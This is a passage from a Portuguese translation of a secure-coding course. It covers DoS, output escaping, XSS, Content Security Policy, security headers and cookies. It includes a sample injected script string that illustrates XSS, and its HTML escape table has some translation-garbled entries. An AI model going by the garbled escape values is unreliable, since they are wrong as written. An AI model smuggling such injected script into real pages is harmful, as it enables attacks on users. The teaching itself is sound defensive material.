"recuo" (por exemplo, um modo somente leitura ou um serviço separado) para que <em>alguns</em> serviços estejam disponíveis durante um ataque agressivo.</p> <p>Outra maneira de dificultar ataques DoS é reduzir a quantidade de recursos que sua aplicação requer. Se os recursos forem temporariamente necessários (por exemplo, identificadores de arquivo, etc.), certifique-se de que sua alocação e consumo sejam controlados e que sejam devolvidos quando não forem mais necessários. Além disso, evite "perder" recursos. A memória é um recurso gerenciado automaticamente por muitas linguagens, mas muitos outros recursos não são ou são facilmente perdidos. Se você precisar retornar manualmente um recurso em uma linguagem com tratamento de exceções, certifique-se de que os recursos sejam retornados <em>mesmo</em> quando uma exceção for lançada.</p> <p><strong>Observação:</strong> Existem vários tipos de vulnerabilidades (relacionadas) no tratamento de recursos, e qualquer uma delas pode levar a uma negação de serviço. Além disso, são problemas comuns:</p> <ul> <li> <p><em>O consumo descontrolado de recursos</em> ( <a href=https://cwe.mitre.org/data/definitions/400.html>CWE-400</a> ) é uma causa tão comum de vulnerabilidades de segurança que está no CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/27 title="GitHub Issue: squidfunk/mkdocs-material #27">#27</a> de 2021 e no CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/20 title="GitHub Issue: squidfunk/mkdocs-material #20">#20</a> de 2019.</p> </li> <li> <p>Isso está altamente relacionado à ausência de uma liberação de recursos, 2019 CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/21 title="GitHub Issue: squidfunk/mkdocs-material #21">#21</a>, <a href=https://cwe.mitre.org/data/definitions/772.html>CWE-772</a> , <em>Ausência de liberação de recurso após tempo de vida efetivo</em> .</p> </li> <li><em>A alocação de recursos sem limites ou limitação</em> ( <a href=https://cwe.mitre.org/data/definitions/770.html>CWE-770</a> ) é uma causa tão comum de vulnerabilidades de segurança que está na 40ª posição do CWE Top 25 de 2021 e na 39ª posição do CWE Top 25 de 2019.</li> </ul> <p>Certifique-se de ter backups de conjuntos de dados importantes e um processo de recuperação viável. Dessa forma, se um invasor conseguir desligar todo o sistema, a perda de dados será minimizada. Se necessário, você pode até reiniciar o serviço em outro lugar ou de alguma outra forma usando os backups. Você deve ter vários backups, e pelo menos alguns dos mais antigos devem estar em armazenamento frio (ou seja, os backups não podem ser modificados por um ataque posterior ao computador). Dessa forma, se backups mais recentes forem corrompidos por um invasor (como por meio de um ataque de ransomware), ainda haverá backups que poderão ser usados.</p> <h2 id=introducao-ao-envio-de-saida>Introdução ao Envio de Saída<a class=headerlink href=#introducao-ao-envio-de-saida title="Permanent link">¶</a></h2> <p>Eventualmente, os programas precisam enviar saída para algum lugar. Pode ser uma resposta a uma solicitação, uma exibição para um usuário, o armazenamento de informações em um banco de dados ou qualquer outra coisa que retorne um resultado.</p> <p>Tudo o que aprendemos sobre o envio de informações para outros programas também se aplica aqui. Por exemplo, muitas vezes você precisará sanitizar, escapar e/ou normalizar a saída que envia de volta para algum usuário.</p> <p>Uma regra prática rápida é que você deve tentar minimizar as informações que seu programa mostra a um usuário não confiável, especialmente se forem relacionadas à segurança:</p> <ul> <li>Se o seu programa exigir algum tipo de autenticação do usuário (como muitos com conexão de rede), forneça ao usuário o mínimo de informações possível antes da autenticação. Em particular, evite revelar o número da versão do seu programa antes da autenticação, a menos que seja fácil de encontrar ou seja a única instância do programa. Caso contrário, se uma versão específica do seu programa apresentar uma vulnerabilidade, os usuários que não atualizarem a partir dessa versão informarão aos invasores que estão vulneráveis.</li> <li>Se um login falhar, informe que houve falha, mas, em geral, não diga o motivo. Por exemplo, não diga que o nome de usuário está errado, a menos que o invasor consiga obter nomes de usuário de qualquer maneira como informações públicas. Nunca diga que uma senha está "quase" correta; ela está correta ou não.</li> <li>Por padrão, não exiba senhas na tela. Por exemplo, em HTML, use o tipo de dado "password", pois ele normalmente substitui cada caractere da senha por um ponto. Caso contrário, um invasor que esteja atrás do usuário poderá obter essas informações, ou elas poderão ser reveladas acidentalmente por um usuário que esteja gravando um vídeo.</li> <li>Se você precisar exibir alguma informação sensível em um formulário, crie uma página separada para isso ou crie um botão que possa ocultar/revelar essa informação. Tente tornar a ocultação de informações sensíveis o padrão. Novamente, isso ajuda a evitar a exposição acidental de informações.</li> <li>Minimize os comentários de código em linha enviados aos usuários; isso desperdiça tráfego de rede e pode revelar informações acidentalmente. Se você estiver usando JavaScript, a minificação pode ajudar a evitar isso.</li> </ul> <p>Seu programa também deve estar preparado para lidar com invasores que rejeitam intencionalmente ou aceitam a saída muito lentamente. Caso contrário, um invasor pode fazer com que seu programa pare de responder a outros usuários, simplesmente obstruindo alguma saída. Implementações que usam comunicações assíncronas geralmente são muito menos vulneráveis ​​a isso, mas qualquer implementação <em>pode</em> apresentar esse problema. Basicamente, certifique-se de que um invasor não possa obstruir um sistema travando ou tornando seu navegador web lento, tendo uma conexão TCP/IP intencionalmente lenta e assim por diante. Em resumo, não crie uma oportunidade fácil para um ataque de Negação de Serviço. Aqui estão algumas dicas:</p> <ul> <li>Libere os bloqueios rapidamente, de preferência antes de responder com <em>qualquer</em> saída.</li> <li>Use tempos limite em gravações orientadas à rede.</li> <li>Meça o tempo desde o início da sua tentativa – não há problema em parar no meio se ela estiver suspeitamente lenta.</li> </ul> <p>Você deve seguir as convenções vigentes do sistema que está usando sempre que possível, já que frequentemente outros componentes dependem disso. Em particular, na web, os métodos <strong>GET</strong> e <strong>HEAD</strong> do HTTP não devem realizar nenhuma ação permanente por si só; eles devem apenas recuperar informações. O método <strong>GET</strong> , em particular, pode ser acionado por um simples clique em um hiperlink em uma página estática e não deve envolver nada permanente, como compra ou venda. Em vez disso, use outros métodos (como <strong>POST</strong> , <strong>PUT</strong> e <strong>DELETE</strong> ) para indicar alterações permanentes. O protocolo HTTP não pode impor isso, mas é a convenção padrão, e muitas ferramentas a assumem, portanto, você também deve aplicar essa regra sempre que possível.</p> <p>Certifique-se de informar ao destinatário exatamente como interpretar a saída. Caso contrário, se ela incluir dados de um invasor, este poderá enganar o destinatário, fazendo-o interpretar incorretamente. Este é um problema especialmente comum em aplicações web:</p> <ul> <li>Indique claramente o tipo <strong>MIME</strong> dos dados que estão sendo enviados. Os navegadores podem até adivinhar, mas podem errar.</li> <li>Indique claramente a codificação de caracteres da saída que está sendo enviada. Não faça o programa receptor adivinhar a codificação de caracteres! Se o programa receptor (normalmente o navegador da web) precisar adivinhar, o invasor pode enganar seu sistema, enviando material que leva a uma suposição errada e, eventualmente, a um ataque. Se você estiver enviando HTML, geralmente deve informar ao destinatário que é UTF-8. A melhor maneira de fazer isso é por meio da opção <strong>de conjunto de caracteres</strong> HTTP , o que geralmente pode ser feito com uma opção de configuração simples. Se você não puder controlar isso por algum motivo, inclua essa informação no <code>&lt;head&gt;</code> HTML , por exemplo, <code>&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;</code> .</li> </ul> <p>De forma mais geral, muitas vezes é necessário usar <em><strong>o escape de saída</strong></em> para que quaisquer dados gerados que possam ser influenciados por um invasor não se tornem um ataque. Este é um problema especialmente comum em aplicações web. Uma das vulnerabilidades mais comuns em aplicações web é o <em>Cross-Site Scripting</em> (XSS). Este problema está relacionado ao envio incorreto da saída e, em particular, ao escape correto da saída. A próxima unidade explicará a vulnerabilidade e como lidar com ela.</p> <h2 id=combatendo-cross-site-scripting-o-problema-xss>Combatendo Cross-Site Scripting: O Problema XSS<a class=headerlink href=#combatendo-cross-site-scripting-o-problema-xss title="Permanent link">¶</a></h2> <p>Uma das vulnerabilidades mais comuns em aplicações web é a vulnerabilidade de Cross-Site Scripting (XSS).</p> <p>Em um ataque XSS, o invasor tenta enganar um navegador web para executar algo malicioso (geralmente executar código malicioso) inserindo informações em uma página web ou aplicação web válida que serão mal interpretadas pelo navegador receptor como algum tipo de ação maliciosa. É sempre abreviado como XSS, pois CSS já possui outro significado (Cascading Style Sheets).</p> <p>O XSS é um problema especialmente comum em páginas ou sites que permitem comentários do usuário, pois os comentários do usuário são um vetor fácil para invasores inserirem suas informações maliciosas.</p> <p>O problema fundamental é que os navegadores web (que operam como clientes) devem presumir que, se receberam alguns dados, o remetente pretendia enviá-los.</p> <p>Afinal, o que mais o navegador web poderia presumir? No entanto, se o remetente criar esses dados combinando dados constantes que controla com dados fornecidos pelo invasor, e os dados fornecidos pelo invasor não forem devidamente higienizados, a combinação pode se tornar maliciosa. A confusão dessa combinação seria então interpretada pelo navegador web como uma solicitação para fazer algo malicioso, o que ele então faz obedientemente.</p> <p>Por exemplo, se o servidor web enviar HTML incorporado com uma string de um usuário não confiável, e um invasor fizer com que essa string contenha <code>&lt;script&gt; do_something_malicious(); &lt;/script&gt;</code>, o usuário poderá acabar executando o programa JavaScript do_something_malicious() .</p> <p>Em XSS, o sistema eventualmente atacado é o navegador web . No entanto, a causa do ataque é um código incorreto escrito no remetente dos dados para o navegador web.</p> <p>Existem três padrões comuns para XSS:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Armazenamento Persistente: Os dados maliciosos são armazenados em um banco de dados para recuperação posterior. Por exemplo, um invasor envia um comentário com um script malicioso incorporado; quando outra pessoa usa seu navegador para visualizar os comentários, o navegador executa o script malicioso.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Reflexão: Os dados maliciosos são enviados pelo navegador da vítima para o servidor (normalmente dentro de uma URL) e imediatamente refletidos de volta para o navegador.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Baseado em DOM: O cliente web envia os dados do ataque para si mesmo, normalmente usando dados fornecidos por um ataque e então enviados via DOM usando JavaScript.</li> </ul> <h1 id=a-solucao-xss-saida-de-escape>A solução XSS: Saída de escape<a class=headerlink href=#a-solucao-xss-saida-de-escape title="Permanent link">¶</a></h1> <p>A maneira padrão de combater o XSS é escapar de todas as saídas que possam ser de um invasor e não sejam especificamente aprovadas. Em muitos aspectos, essa é a melhor contramedida. Feita corretamente, ela neutraliza completamente o ataque e é muito flexível. Por exemplo, se você tiver dados HTML não confiáveis ​​de um invasor, aplique os escapes HTML padrão, a menos que tenha um bom motivo para fazer o contrário:</p> <p>Tabela: Escapes HTML padrão</p> <table> <thead> <tr> <th>Original</th> <th>HTML escapado</th> </tr> </thead> <tbody> <tr> <td><strong>&amp;</strong></td> <td><strong>&amp;a‌mp;</strong></td> </tr> <tr> <td><strong>&lt;</strong></td> <td>****&amp;‌lt;****</td> </tr> <tr> <td><strong>&gt;</strong></td> <td><strong>&amp;g‌t;</strong></td> </tr> <tr> <td><strong>"</strong></td> <td><strong>"não;</strong></td> </tr> <tr> <td><strong>'</strong></td> <td><strong>&amp;#‌39;</strong> ou <strong>&amp;ap‌os;</strong></td> </tr> </tbody> </table> <p><strong>Na sanitização de saída, assim como na validação de entrada, geralmente é melhor identificar uma lista de permissões e aplicar escapes ao restante</strong>.</p> <p>No entanto, às vezes, os escapes de saída obrigatórios são uma lista bem definida que você pode aplicar diretamente, pois às vezes <em>é possível</em> enumerar as categorias com segurança, como fizemos aqui para HTML.</p> <p>Tecnicamente, há casos em que você não precisa aplicar os escapes a dados não confiáveis, mas em HTML geralmente é mais simples e rápido aplicá-los automaticamente a todos, a menos que você tenha uma necessidade específica de permitir algo diferente.</p> <p>É claro que esses escapes são apenas para o HTML em si; eles não são suficientes por si só para outros formatos de dados (como URLs incorporadas e cabeçalhos HTTP).</p> <p>Aqui está o problema: você precisa ser <em>perfeito</em> .</p> <p>Se você escapar da saída corretamente 99,9% das vezes e gerar saída em 1.000 lugares, seu programa estará <strong>vulnerável</strong> .</p> <p>Você pode ser um gênio, mas isso não é relevante; até mesmo gênios cometem erros. Mesmo que o software fosse <em>originalmente</em> perfeito, uma alteração posterior pode facilmente introduzir uma vulnerabilidade. Precisamos de uma solução melhor do que <em>"nunca cometa um erro que seja fácil de cometer"</em> — especialmente quando algo acontece repetidamente.</p> <p>Na maioria dos casos, a melhor solução para XSS é <em><strong>escolher um framework ou biblioteca que escape automaticamente a saída HTML para você</strong></em> .</p> <p>Dessa forma, o escape da saída é feito, mas você não precisa ficar pensando nisso constantemente.</p> <p>Em vez disso, o sistema de saída escapa automaticamente a saída para você (isso às vezes é chamado de <em>escape automático</em> ). Esse escape normalmente é feito usando um dos muitos sistemas de modelos disponíveis que permitem especificar o modelo de constante (que é confiável e, portanto, passa por um escape não especificado) e os dados (onde dados não confiáveis ​​são escapados por padrão).</p> <p>Existem muitas opções que fazem isso.</p> <p>A biblioteca JavaScript React, por exemplo, faz o escape por padrão de quaisquer valores incorporados em sua linguagem JSX antes de renderizá-los.</p> <p>O Ruby on Rails faz o escape de valores HTML por padrão ao usar seus modelos ERB.</p> <p>O framework web Python Flask usa a biblioteca de modelos Jinja para renderizar modelos, e o Jinja faz o escape automático de dados renderizados em um modelo HTML.</p> <p>Esta não é uma lista completa; o escape automático é um recurso muito comum em frameworks web. Recomendamos fortemente que você escolha apenas frameworks web e bibliotecas de saída que façam o escape de HTML por padrão; há muitas opções boas para escolher.</p> <h2 id=quando-voce-precisa-permitir-dados-nao-confiaveis-sem-escape>Quando você precisa permitir dados não confiáveis ​​sem escape<a class=headerlink href=#quando-voce-precisa-permitir-dados-nao-confiaveis-sem-escape title="Permanent link">¶</a></h2> <p>Ocasionalmente, você <em>precisa</em> permitir a passagem de dados sem escape.</p> <p>Um motivo <em>para</em> omitir alguns escapes é que você deseja que dados não confiáveis ​​tenham alguma ação que o escape impediria.</p> <p>Por exemplo, digamos que você queira que usuários não confiáveis ​​forneçam HTML que colocará parte do texto em itálico.</p> <p>Nesse caso, você deve permitir a passagem <strong>de <i></i></strong> e <strong></strong> (itálico), mesmo que normalmente escape os caracteres <strong>&lt;</strong> e <strong>&gt; .</strong></p> <p>O problema é que, uma vez que você permite a passagem de qualquer informação adicional, o código necessário para escapar corretamente a saída se torna muito mais complexo.</p> <p>Por exemplo, você precisa garantir que cada tag de abertura ( <code>&lt;i&gt;</code> ) tenha uma tag correspondente, que elas se aninham corretamente, que não tenham atributos ou que esses atributos sejam permitidos, e que apenas as tags e atributos que você permitir sejam permitidos.</p> <p>Há muitos casos em que isso se torna uma vulnerabilidade. Afinal, muitas estruturas escapam dados por padrão, mas quando os desenvolvedores precisam deixar algo passar, às vezes eles permitem <em>demais</em> .</p> <p>Nesse caso, sempre que possível, use bibliotecas <em>já projetadas</em> para permitir apenas o que você deseja e ignorar todo o resto.</p> <p>A maioria das linguagens de programação e frameworks mais utilizados já possui bibliotecas que permitem definir o que deve ser permitido e, em seguida, ignorar, remover ou proibir o restante.</p> <h2 id=urls>URLs<a class=headerlink href=#urls title="Permanent link">¶</a></h2> <p>Nós nos concentramos em escapar do HTML, porque esse é o maior problema em aplicações web. Mas o HTML pode incorporar outros tipos de dados e, desses, talvez os mais comuns sejam URLs.</p> <p>URLs incorporadas também devem ser escapadas, e as regras para escapar URLs são diferentes. A sintaxe da URL geralmente é <strong>scheme:[//authority]path[?query][#fragment]</strong> . Por exemplo, na URL <code>ht‌tps://www.linuxfoundation.org/about/</code> , o esquema é <strong>https</strong> , a autoridade é <strong>w‌ww.linuxfoundation.org</strong> , o caminho é <strong>/about/</strong> e este exemplo não tem parte de consulta ou fragmento. Às vezes, você precisa de caracteres especiais no caminho, consulta ou fragmento. A maneira convencional de escapar essas partes das URLs é primeiro garantir que os dados estejam codificados com UTF-8 e escapar como <strong>%hh</strong> (onde <strong>hh</strong> é a representação hexadecimal) todos os bytes, exceto os bytes "seguros", que normalmente são <strong>AZ</strong> , <strong>az</strong> , <strong>0-9</strong> , " <strong>.</strong> ", " <strong>-</strong> ", " ***** " e " <strong>_</strong> ". A rotina Java <strong>ja‌va.net.URLEncoder.encode()</strong> transforma todos os espaços em " <strong>+</strong> " em vez de " <strong>%20</strong> "; ambas as convenções " <strong>+</strong> " e " <strong>%20</strong> " são amplamente utilizadas.</p> <h2 id=alternativas-xss>Alternativas XSS<a class=headerlink href=#alternativas-xss title="Permanent link">¶</a></h2> <p>Normalmente, você deve usar uma estrutura que escape automaticamente o HTML por padrão.</p> <p>Se, por algum motivo, não for possível, você pode criar um wrapper que faça o escape para você e envie a saída. Um wrapper é mais arriscado se for fácil não chamá-lo. Se você usar um wrapper, ele também deve executar a saída. Se você chamar uma rotina de escape separadamente e, em seguida, chamar para produzir a saída, é especialmente fácil esquecer de chamar o wrapper. Por exemplo, se você usar <strong>SendOutput(EscapeHTML(data))</strong> , será muito fácil usar o vulnerável <strong>SendOutput(data)</strong> .</p> <p>Uma alternativa às vezes sugerida é usar uma filtragem de entrada muito rigorosa que impede todos os metacaracteres HTML ( <strong>&amp; &lt; &gt; " '</strong> ). Em teoria, isso impede XSS em HTML.</p> <p>Se você <em>puder</em> limitar sua entrada dessa forma, deve fazê-lo, pois sempre deve limitar suas entradas não confiáveis ​​o máximo possível. Na prática, embora a filtragem de entrada rigorosa possa ajudar a combater outros ataques, geralmente <em>não</em> é suficiente para combater XSS. O problema é que, geralmente, algumas entradas eventualmente precisam permitir alguns metacaracteres HTML.</p> <p>Por exemplo, um O'Malley ficaria insatisfeito com um sistema que não permitisse aspas simples em um nome. Mesmo um sistema que começa com essa limitação muitas vezes a supera, portanto, você não pode contar com a validação de entrada rigorosa <em>por si só</em> para combater XSS. Sim, use a validação de entrada rigorosa onde puder como uma medida de proteção - mas não é suficiente para combater XSS.</p> <p>Uma medida de proteção muito branda é definir o atributo <strong>HttpOnly</strong> nos cookies. Dessa forma, se um script malicioso for executado, ele não poderá ver o valor do cookie. Você <em>deve</em> definir essa limitação sempre que possível, pois ela limita privilégios, mas essa é uma medida de proteção muito branda que só é útil se você aplicar <em>outras</em> medidas também.</p> <p>Geralmente, a melhor maneira de combater o XSS é escolhendo uma estrutura ou biblioteca que escape automaticamente a saída para você. No entanto, os programas costumam ter muitas saídas. Seria melhor combinar essa solução com algo que limitasse os danos causados ​​por um erro <em>.</em> Na web, existe uma solução: a Política de Segurança de Conteúdo (CSP). A próxima unidade discutirá isso.</p> <h2 id=politica-de-seguranca-de-conteudo-csp>Política de Segurança de Conteúdo (CSP)<a class=headerlink href=#politica-de-seguranca-de-conteudo-csp title="Permanent link">¶</a></h2> <p>Ao criar aplicações web, uma ferramenta realmente importante para limitar danos é uma <em>Política de Segurança de Conteúdo</em> (CSP).</p> <p>Se existir, a CSP informa ao navegador web receptor o que é permitido e o que não é permitido do ponto de vista da segurança.</p> <p>A CSP por si só não previne a maioria dos ataques, mas pode dificultar a exploração de muitas vulnerabilidades ou reduzir significativamente seu impacto. Isso torna a CSP uma importante <em>medida de defesa em profundidade</em> para reduzir riscos.</p> <p>Normalmente, uma referência ao CSP é enviada como um cabeçalho HTTP (chamado <strong>Content-Security-Policy</strong> ) e, como todos os cabeçalhos HTTP, o usuário a recebe <em>antes</em> de receber o conteúdo principal.</p> <p>Você também pode enviar informações do CSP como um elemento HTML <strong><meta></strong> com o atributo <strong>http-equiv</strong> definido como <strong>Content-Security-Policy</strong> .</p> <p>No entanto, usar o elemento <strong><meta></strong> não é tão eficaz quanto usar o cabeçalho HTTP, pois o sistema já começou a processar o HTML nesse ponto.</p> <p>Portanto, tente usar o cabeçalho HTTP. Se você precisar usar o CSP por meio de um elemento HTML, inclua esse elemento <strong><meta></strong> o mais rápido possível no seu HTML, para que ele entre em vigor o mais rápido possível.</p> <p>Talvez o recurso mais importante do CSP seja a capacidade do CSP de controlar quais scripts podem ser executados.</p> <p>Por padrão, um navegador executa todos os scripts enviados a ele.</p> <p>Isso é terrível se houver uma vulnerabilidade XSS, pois o ataque pode infiltrar código na página e fazer com que o navegador da vítima o execute. Uma solução de segurança melhor é separar o código dos dados e limitar os privilégios. Podemos fazer isso com o CSP.</p> <p>Aqui está um CSP simples que previne um grande número de ataques. Este CSP diz que os recursos (em particular scripts e estilos) são apenas do site de origem ( <strong>'self'</strong> ) e que <strong>inline</strong> ou <strong>evals</strong> para scripts e estilos não são permitidos (porque não foram especificamente permitidos):</p> <p><strong>Content-Security-Policy: default-src 'self';</strong></p> <p>O desafio deste CSP é que, para aproveitá-lo ao máximo, precisamos <em>parar</em> de usar estilos e scripts embutidos.</p> <p>O HTML pode solicitar o <em>carregamento</em> de arquivos JavaScript e estilos CSS, mas os estilos JavaScript e CSS devem estar em arquivos separados. O HTML pode incluir muitas informações importantes para scripts e estilos (como <strong>tag</strong> , <strong>class</strong> e <strong>id</strong> ), mas não pode incorporar scripts e estilos diretamente.</p> <p>Nunca usar scripts e estilos inline é amplamente considerado uma boa prática, mas é mais do que isso; melhora drasticamente a segurança. Se scripts e estilos inline forem ignorados, um ataque XSS que subverte uma página HTML <em>não pode</em> facilmente fazer com que um script ou estilo não confiável seja usado. Isso não previne todos os ataques, mas previne muitos, e torna outros ataques significativamente mais difíceis.</p> <p>Se você puder <em>parar</em> de usar todos os scripts e estilos inline e impor isso por meio do seu CSP, o sistema se tornará mais resistente a uma variedade de ataques.</p> <p>Mas e se essa política for muito difícil de implementar em uma página ou não atender às suas circunstâncias? Isso não é um problema; basta usar um CSP <em>diferente</em> para essa página. A especificação do CSP oferece uma série de opções que você pode usar para permitir mais operações e restringir outras.</p> <p>Como sempre, seu objetivo é o privilégio mínimo: tente tornar o CSP o mais restritivo possível. Geralmente, você obterá mais benefícios se modificar seu sistema para que ele possa usar um CSP mais restritivo em todas as páginas, mas mesmo uma pequena restrição pode trazer alguns benefícios. Maneiras comuns de flexibilizar as limitações de scripts e estilos são:</p> <ul> <li>Tenha um CSP restritivo no máximo de páginas da web possível, permitindo, por exemplo, apenas scripts e estilos de locais específicos do seu site (nunca inline). Depois, relaxe as restrições nas páginas onde isso é atualmente difícil.</li> <li>Permitir o carregamento de scripts e estilos de outros sites específicos. Você pode definir <strong>default-src</strong> (onde os arquivos de origem dos scripts são carregados) para permitir outros sites específicos que você listar. Isso informa ao navegador que você confia totalmente nesses sites específicos. Cuidado, pois isso pode prejudicar a privacidade do usuário. Por exemplo, cada organização que gerencia esses outros sites saberá pelo <em>menos</em> quando um usuário recupera essas informações e seu endereço IP.</li> <li>Permitir hashes específicos. Você pode definir <strong>default-src</strong> para permitir um programa inline específico, informando que seu hash criptográfico pode ser executado usando o formato <code>&lt;algoritmo-hash&gt;-&lt;valor-base64&gt;</code>. Esta pode ser uma etapa intermediária útil se você já tiver scripts inline, embora, a longo prazo, seja melhor mover esses scripts para um arquivo separado.</li> </ul> <p>O CSP possui vários outros mecanismos para limitar privilégios. Outro parâmetro CSP especialmente importante é <strong>o frame-ancestors</strong> , uma ótima ferramenta para combater ataques de clickjacking. Um ataque de clickjacking ocorre quando um invasor pode "sequestrar" um clique que o usuário pretendia para um propósito, mas, na verdade, o clique foi "sequestrado" para outro propósito. Os invasores geralmente fazem isso usando indevidamente os recursos de frames do HTML. Se você não usa frames — e a maioria dos sites não usa —, pode corrigir isso facilmente incluindo <code>"frame-ancestors 'none';"</code> em sua política. Se você usa frames, use <code>frame-ancestors 'self';</code> em vez disso.</p> <p>Ao desenvolver um site, pode ser sensato consultar a especificação CSP e tentar limitar ao máximo o que você solicita aos navegadores. Quanto menos você permitir, menos os invasores poderão fazer se você cometer um erro. Existem outros cabeçalhos HTTP que podem ajudar a proteger um site contra ataques; na próxima unidade, veremos alguns.</p> <h2 id=outros-cabecalhos-de-protecao-http>Outros cabeçalhos de proteção HTTP<a class=headerlink href=#outros-cabecalhos-de-protecao-http title="Permanent link">¶</a></h2> <p>Ao entregar páginas web, você pode limitar o que pode ser feito com os resultados, dificultando que invasores causem danos sérios.</p> <p>Em resumo, existem outros cabeçalhos HTTP que você pode definir e que, às vezes, podem proteger seus aplicativos contra ataques. Já discutimos a Política de Segurança de Conteúdo (CSP), que talvez seja a mais importante.</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>X-Content-Type-Options</td> <td>Isso deve ser definido como <strong>nosniff</strong> , o que significa que os tipos MIME fornecidos estão corretos e que o receptor não deve tentar adivinhar qual é o tipo. Isso significa que invasores não conseguirão enganar o navegador da web e fazê-lo usar um tipo diferente.</td> </tr> <tr> <td>Opções de X-Frame</td> <td>Deve ser definido como <strong>DENY</strong> ou <strong>SAMEORIGIN</strong> . Assim como o CSP <strong>frame-ancestors</strong> , isso impede o uso de frames ou os permite apenas da origem, neutralizando muitos ataques de clickjacking. Tecnicamente, o X-Frame-Options foi substituído pelo CSP <strong>frame-ancestors</strong> , mas se você usa o Internet Explorer (IE), também precisará dele, pois o IE não oferece suporte ao CSP <strong>frame-ancestors</strong> .</td> </tr> <tr> <td>Segurança de Transporte Estrita HTTP (HSTS)</td> <td>Isso significa que apenas o protocolo HTTPS seguro, e não o protocolo HTTP inseguro, é permitido para futuras visitas a este site por um determinado número de segundos. Uma configuração comum é " <strong>Strict-Transport-Security: max-age=31536000;",</strong> o que significa que <em>apenas</em> HTTPS será permitido por um ano (o número é o número de segundos). Um número maior é suficiente.</td> </tr> </tbody> </table> <p>Se o seu site for de acesso público, você pode testar facilmente seus cabeçalhos usando o <a href=https://securityheaders.com/ >site Cabeçalhos de Segurança</a> .</p> <p>Além disso, uma observação importante sobre cabeçalhos HTTP em geral.</p> <p>Você pode decidir, por vários motivos, fornecer outros cabeçalhos HTTP.</p> <p>Se algumas dessas informações de cabeçalho puderem ser de um invasor, seja <em>especialmente cuidadoso</em> .</p> <p>Como sempre, faça uma validação de entrada muito cuidadosa.</p> <p>Há um ataque desagradável, em particular, em que o invasor consegue inserir uma quebra de linha na entrada; isso causará a <em>divisão do cabeçalho HTTP</em> nas versões 1.1 e 2 do HTTP, onde o restante do texto após a quebra de linha pode ser interpretado como um cabeçalho HTTP fornecido pelo invasor.</p> <p>Isso pode desabilitar muitas proteções ou até mesmo implementar um ataque.</p> <h2 id=cookies-e-sessoes-de-login>Cookies e sessões de login<a class=headerlink href=#cookies-e-sessoes-de-login title="Permanent link">¶</a></h2> <p>Um mecanismo importante no protocolo HTTP é o suporte a <em>cookies</em> .</p> <p>Cookies são pequenos blocos de dados enviados de um servidor web para um navegador. A partir de então, quando o navegador contata esse servidor, ele envia o valor do cookie de volta ao servidor de origem, sujeito a certas restrições.</p> <h2 id=atributos-de-cookies>Atributos de cookies<a class=headerlink href=#atributos-de-cookies title="Permanent link">¶</a></h2> <p>Os servidores web também podem definir alguns atributos nos cookies que enviam. Por exemplo:</p> <ul> <li><strong>Tempo de expiração:</strong> Se nenhum tempo de expiração for definido, o cookie expirará quando o navegador for encerrado (esses cookies são chamados de <em>cookies de sessão</em> ). Caso contrário, o navegador poderá armazenar o cookie permanentemente até que o tempo expire (esses cookies são chamados de <em>cookies permanentes</em> — um usuário <strong>pode</strong> excluí-los, mas poucos o fazem).</li> <li><strong>Sinalizador</strong> <strong>de segurança</strong>: Se definido, o cookie será enviado apenas para servidores HTTPS, e não para HTTP. Você deve definir isso sempre que possível.</li> <li><strong>Sinalizador</strong> <strong>HttpOnly</strong>: O cookie não é visível para programas JavaScript. Você deve defini-lo sempre que possível.</li> <li><strong>SameSite</strong> : Isto tem três valores principais - <strong>None</strong> , <strong>Lax</strong> e <strong>Strict. None</strong> significa que os cookies são sempre enviados para o servidor web correspondente. <strong>Lax</strong> significa que os cookies são enviados se forem um <strong>GET</strong> (clique) em um site de terceiros e, caso contrário, os cookies são enviados apenas se a solicitação vier do mesmo site. <strong>Strict</strong> significa que os cookies são enviados apenas em um contexto primário; qualquer solicitação de outro site <em>não</em> fará com que o cookie seja enviado. Historicamente, o padrão do navegador da web era efetivamente <strong>None</strong> , mas os navegadores da web modernos agora agem com <strong>Lax</strong> como padrão porque isso neutraliza certos ataques. Discutiremos isso mais tarde, mas você deve definir isso para pelo menos <strong>Lax</strong> sempre que possível.</li> </ul> <h2 id=cookies-em-contexto>Cookies em Contexto<a class=headerlink href=#cookies-em-contexto title="Permanent link">¶</a></h2> <p>Os cookies não são, por si só, necessariamente maliciosos. No entanto, os cookies podem revelar quem é o solicitante em alguns casos, tornando-os um potencial problema de privacidade. Isso é especialmente verdadeiro para cookies que têm <strong>SameSite=None</strong> . Se alguém configurar solicitações para esse tipo de cookie em muitos sites (por exemplo, incorporando imagens de terceiros), o cookie pode ser usado para rastrear as ações desse usuário em muitos sites. Um cookie destinado a rastrear usuários em sites é chamado de <em>cookie de rastreamento</em> . Os cookies de rastreamento podem ser ainda piores se tiverem um longo tempo de expiração, porque esses cookies persistem após a saída do navegador. Os cookies de rastreamento têm atraído as preocupações de muitas nações devido ao seu efeito prejudicial na privacidade do usuário. Como resultado, várias leis foram aprovadas envolvendo cookies e consentimento. No entanto, implementar cookies de rastreamento não é a única maneira de usar cookies; os cookies também podem melhorar a segurança.</p> <p>Os cookies são importantes, em parte, porque são frequentemente usados ​​para implementar sessões de login na World Wide Web (WWW). Uma sessão de login é simplesmente um período de atividade entre o login e o logout de um usuário.</p> <p>O protocolo WWW original não tinha como implementar sessões de login, e os cookies fornecem um mecanismo simples para suportar sessões de login.</p> <h2 id=cookies-e-sessoes-de-login_1>Cookies e Sessões de Login<a class=headerlink href=#cookies-e-sessoes-de-login_1 title="Permanent link">¶</a></h2> <p>Na web, uma maneira comum de implementar uma sessão de login é ter um formulário de login. Se o login for bem-sucedido, o servidor web envia um <strong>ID de sessão</strong> dentro de um valor de cookie. O ID de sessão é simplesmente um grande número aleatório que não pode ser adivinhado por ninguém. A partir de então, o navegador web envia esse cookie (com o ID de sessão) sempre que contata esse servidor web. O servidor web pode verificar esse ID de sessão para ver quem está fazendo a solicitação... e se esse ID de sessão for válido, o servidor web procura o <strong>ID do usuário</strong> para essa sessão e permite que o usuário faça o que estiver autorizado a 